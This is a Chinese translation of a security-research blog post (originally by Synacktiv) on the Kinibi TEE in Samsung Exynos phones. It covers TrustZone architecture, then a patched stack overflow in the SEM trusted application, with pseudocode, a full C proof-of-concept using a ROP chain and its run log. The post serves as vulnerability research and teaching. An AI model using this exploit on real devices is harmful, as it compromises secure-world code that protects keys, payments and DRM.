> 原文链接: https://www.anquanke.com//post/id/167837 


# KINIBI TEE 的可信环境及相关漏洞与利用方法


                                阅读量   
                                **354381**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者synacktiv，文章来源：synacktiv.com
                                <br>原文地址：[https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html](https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html)

译文仅供参考，具体内容表达以及含义原文为准



[![](https://p2.ssl.qhimg.com/t0128c399a18195b4a3.png)](https://p2.ssl.qhimg.com/t0128c399a18195b4a3.png)



## 前言

很多Android设备和嵌入式系统都使用TEE(Trusted Execution Environment,可信执行环境)来实现一些安全功能(如硬件密码/密钥、DRM（数字版权保护）、移动支付、生物识别等等)。在ARM平台上，TEE是使用ARM Trustzone技术将其运行环境与标准操作系统(如Linux)隔离开来的小型操作系统。

TEE操作系统比传统的终端应用运行环境(REE,Rich Execution Environment，如Android)简单得多，对逆向工程来说也是一件有趣的事情。这篇文章介绍Trustonic的TEE实现，特别是三星为Exynos芯片组所做的集成。三星最近修补了可信应用（TA, Trusted Application）中的一个漏洞。在简要介绍Trustzone/Kinibi之后，本文详细介绍了该漏洞的利用情况。



## TrustZone

在Trustzone体系结构中，TEE运行在安全状态的EL1异常级别。可以在此基础上加载可信的应用程序，并在安全状态的EL0异常级别运行。受信任的应用程序是签名的映像，只有在映像签名正确且来自受信任的开发人员的情况下才能加载。

REE通过执行Secure Monitor调用(在内核模式下使用SMC特权指令)与TEE通信。这些调用由Secure Monitor处理，并中继到TEE内核。

[![](https://p2.ssl.qhimg.com/t018d0385186d9c1c05.png)](https://p2.ssl.qhimg.com/t018d0385186d9c1c05.png)

Trustzone允许使用非安全标志(NS, Non-Secure)标记内存，从而将安全区域内存与正常区域隔离开来。在正常情况下运行的代码只能访问标记为NS的内存。

在移动端上有三个主要的TEE实现：
- 基于高通SoC设备的QSEE/QTEE
- 华为的TrustedCore
- Trustonic的Kinibi
有一个开源实现：[OP-TEE](https://github.com/OP-TEE/optee_os)，这个版本可以在QEMU和一些开发板上运行。



## Kinibi

Kinibi是由Trustonic(也称为T-Base或Mobicore)构建的TEE实现，主要用于Mediatek和ExynosSoC。Kinibi由多个组件组成：
- 微内核：MTK
- 运行时管理器：RTM
- 少数内置驱动程序：密码，安全存储等
- 应用程序/驱动程序使用的库：McLib
Kinibi只在Aarch32模式下运行。

[![](https://p2.ssl.qhimg.com/t01651474fa0f9554de.png)](https://p2.ssl.qhimg.com/t01651474fa0f9554de.png)

微内核运行在安全状态的EL1异常级别。它提供对驱动程序和可信应用的系统调用，并强制任务隔离。Secure Monitor中的一段代码将SMC中断中继到TEE内核，这允许两个区域之间的通信。内核还执行抢占式调度。

运行管理器是Kinibi的主要任务，它管理正常客户端和可信应用之间的会话。当REE客户端打开新会话时，RTM首先检查应用程序是否已经加载。加载过程涉及应用程序二进制的签名检查。还可以对应用程序二进制文件进行加密，因此RTM在加载可信应用之前对其进行解密。

驱动程序在安全状态的EL0异常级别运行，由于它们的二进制文件具有与可信应用完全相同的格式，所以它们使用相同的API加载。驱动程序可以访问比TA更多的系统。这些附加的系统允许驱动程序映射其他任务内存、物理内存、执行SMC调用等。

在三星手机上，这些组件可以很容易地从sboot.bin中提取出来。<a>@kutyacica</a>在EkoParty会议上介绍了提取这些部分的一种很好的方法。他在sboot.bin二进制文件中找到了一个表，其中包含了不同组件的偏移量。自Galaxy S6以来，这个表的格式略有改变，但打开二进制文件仍然很简单。



## Trusted Applications（可信应用）

在大多数情况下，可信应用和驱动程序都是签名的二进制文件，但没有加密，可以很容易地进行分析。在三星手机上，这些二进制文件存储在`/vendor/app/mcRegistry/和/system/app/mcRegistry/`目录中。

可信应用和驱动程序二进制文件使用的格式是MCLF格式，该格式被记录在[trustonic-tee-user-space](https://github.com/Trustonic/trustonic-tee-user-space/blob/master/common/MobiCore/inc/mcLoadFormat.h) GitHub项目的头文件中。使用[mclf-ida-loader](https://github.com/ghassani/mclf-ida-loader)可以在IDA中加载这种格式。

当TA加载时，Kinibi使用MCLF报头来映射TA内存空间中的代码、数据和BSS区域。mcLib库映射到一个固定地址(GalaxyS8/S9上为0x07d00000)。打开会话时，共享缓冲区(称为tci)也会映射到固定地址：0x00100000或0x00300000，这取决于MCLF头中指定的版本。

REE中的TA客户端可以映射新的共享内存区域，这些区域映射在`0x00200000 + map_id*0x00100000`。

[![](https://p5.ssl.qhimg.com/t012945eb5199fe891f.png)](https://p5.ssl.qhimg.com/t012945eb5199fe891f.png)

大多数可信使用tci共享内存作为输入和输出缓冲区，前32位用作命令标识符（cammand id）。通常初始化在入口点(密码初始化、堆栈cookie随机化等)进行，然后调用主函数。main函数检查共享缓冲区大小，然后启动主循环。TA使用`tlApiWaitNotification` API等待新消息，并处理共享缓冲区的内容。响应数据被写入共享缓冲区，TA使用`tlApiNotify` API通知REE，并等待新消息。



## TA exploitation 101

即使TEE系统专门用于安全操作，操作系统也没有ASLR/PIE那样的安全强化，这使得利用可信应用中的漏洞变得非常容易。

三星在`G955FXXU2CRED`和`G955FXXU3CRGH`(Galaxy S8+)中修补了SEM TA(`fffffffff0000000000000000000001b.tlbin`)。

修补程序修复了0x1B命令处理程序中可直接访问的基于堆栈的缓冲区溢出。此外，在这个TA的新版本中启用了堆栈cookie。

```
/* pseudo code in G955FXXU2CRED */
void __fastcall handle_cmd_id_0x1b(unsigned int *tciBuffer)
`{`
  // [...]
  char v64[256]; // [sp+158h] [bp-770h]
  char v65[256]; // [sp+258h] [bp-670h]
  char v66[200]; // [sp+358h] [bp-570h]
  char v67[1024]; // [sp+420h] [bp-4A8h]
  char v68[64]; // [sp+820h] [bp-A8h]
  char v69[52]; // [sp+860h] [bp-68h]
  int v70; // [sp+894h] [bp-34h]

  bzero(v66, 0xC8u);
  bzero(v64, 0x100u);
  bzero(v65, 0x100u);
  bzero(v68, 0x40u);
  v4 = tciBuffer[2];
  v5 = tciBuffer[3];
  // memcpy with source and length controlled
  memcpy(v66, tciBuffer + 4, tciBuffer[3]);
  v6 = v5 + 12;
  v7 = *(int *)((char *)tciBuffer + v5 + 16);
  if ( tciBuffer[23042] &gt; (unsigned int)(v7 + 208) )
  `{`
    snprintf(v67, 0x400, "~%18s:%4d: Input data is over the buffer.", v8, 113);
    print("[E]SEM %sn", v67);
    return;
  `}`
  // [...]
```

如果没有堆栈cookie，就可以在命令处理程序中直接访问基于堆栈的缓冲区溢出，这应该会使你想起你的第一次开发利用。

可信应用具有read-exec代码页和read-write数据页映射。Kinibi没有类似mprotect的syscall，也不提供syscall和可信应用之间的映射，因此在TA中执行任意代码的唯一方法是对其代码进行ROP。

为了与TEE进行通信，使用了libMcClient.so库。该库提供了加载TA、打开会话、映射内存和通知可信应用的功能。Trustonic给出了使用这个库的头文件：MobiCoreDriverApi.h。在Android上，只有一些特权应用程序和具有特定SElinux上下文的应用程序可以使用TEE驱动程序。

以下是一个简单的漏洞，即ROP打印受控的日志字符串，在三星设备上TEE日志在KMSG中打印。

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;

#include "MobiCoreDriverApi.h"

#define err(f_, ...) `{`printf("[33[31;1m!33[0m] "); printf(f_, ##__VA_ARGS__);`}`
#define ok(f_, ...) `{`printf("[33[32;1m+33[0m] "); printf(f_, ##__VA_ARGS__);`}`
#define info(f_, ...) `{`printf("[33[34;1m-33[0m] "); printf(f_, ##__VA_ARGS__);`}`
#define warn(f_, ...) `{`printf("[33[33;1mw33[0m] "); printf(f_, ##__VA_ARGS__);`}`

int main(int argc, char **argv) `{`
    mcResult_t ret;
    mcSessionHandle_t session = `{`0`}`;
    mcBulkMap_t map;
    uint32_t stack_size;
    char *to_map;


    // ROPgadget --binary fffffffff0000000000000000000001b.tlbin 
    //             --rawArch arm --rawMode thumb --offset 0x1000
    uint32_t rop_chain[] = `{`
        0x38c2 + 1, // pop `{`r0, r1, r2, r3, r4, r5, r6, pc`}`
        0x0,        // r0 (will be the string to print)
        0x0,        // r1 (argument, will be set after mcMap)
        0x0,        // r2 (not used)
        0x0,        // r3 (not used)
        0x0,        // r4 (not used)
        0x0,        // r5 (not used)
        0x0,        // r6 (not used)
        0x25070 + 1 // tlApiPrintf wrapper
    `}`;

    FILE *f = fopen(
        "/data/local/tmp/fffffffff0000000000000000000001b.tlbin",
        "rb"
    );
    if(!f) `{`
        err("Can't open TA %sn",argv[1]);
        return 1;
    `}`
    fseek(f, 0, SEEK_END);
    uint32_t ta_size = ftell(f);
    fseek(f, 0, SEEK_SET);


    char *ta_mem = malloc(ta_size);
    if (fread(ta_mem, ta_size, 1, f) != 1) `{`
        err("Can't read TA");
        return 1;
    `}`

    uint32_t tciLen = 0x20000; // TA access to fixed offset on this WSM
                               // so the buffer should be large enough
    uint32_t *tci = malloc(tciLen);

    ret = mcOpenDevice(MC_DEVICE_ID_DEFAULT);
    if(ret != MC_DRV_OK) `{`
        err("Can't mcOpenDevicen");
        return 1;
    `}`

    to_map = strdup("--&gt; Hello from the trusted application &lt;--n");

    ret = mcOpenTrustlet(&amp;session, 0, ta_mem, ta_size, 
                         (uint8_t *)tci, tciLen);
    if(ret == MC_DRV_OK) `{`
        // map the string in TA virtual space, the API returns
        // the address in the TA space.
        ret = mcMap(&amp;session, to_map, 40960, (mcBulkMap_t *)&amp;map);
        if (ret != MC_DRV_OK) `{`
            err("Can't map inn");
            return 1;
        `}`
        ok("Address in TA virtual memory : 0x%xn", map.sVirtualAddr);

        // rop_chain[1] is R0, point it to the string in TA 
        // address space.
        rop_chain[1] = map.sVirtualAddr;

        stack_size  = 0x54c; // fill stack frame
        stack_size += 0x20;  // popped registers size

        // fill tciBuffer
        tci[0] = 27;                             // cmd id
        tci[3] = stack_size + sizeof(rop_chain); // memcpy size
        memcpy(&amp;tci[4 + stack_size/4], &amp;rop_chain, sizeof(rop_chain));

        // notify the TA
        mcNotify(&amp;session);
        mcWaitNotification(&amp;session, 2000);
        mcCloseSession(&amp;session);
    `}`
    mcCloseDevice(MC_DEVICE_ID_DEFAULT);
    return 0;
`}`
```

```
dreamlte:/ # /data/local/tmp/exploit_sem
[+] Address in TA virtual memory : 0x2005f0

dreamlte:/ # dmesg -c | grep TEE
TEE: b01|[I]SEM  [INFO]:Start SEM TA :: Version: 2016.06.15.1
TEE: b01|[E]SEM  Wrong CCM version
TEE: b01|[E]SEM  Wrong CCM version
TEE: b01|[E]SEM  handleCCMDataSWP [ error END]
TEE: b01|--&gt; Hello from the trusted application &lt;--
```



## 结论

本文展示了在可信应用中实现任意代码执行有多么容易。SEM应用程序包含其他很多漏洞，但堆栈cookie限制了攻击的实现。

TA中已修补的漏洞在最新的设备上应该是不可利用的，因为TEE提供了一种反回滚机制（anti-rollback）。不幸的是，在合并与安全相关的补丁时，三星并不总是增加版本号。这是SEM TA的情况，这意味着旧版本仍然可以加载和利用。在许多三星设备上，反回滚机制似乎根本不起作用(就像在S8上那样)。

在可信应用中获得代码执行大大增加了攻击面，因为攻击者可以与安全驱动程序和TEE内核系统交互。
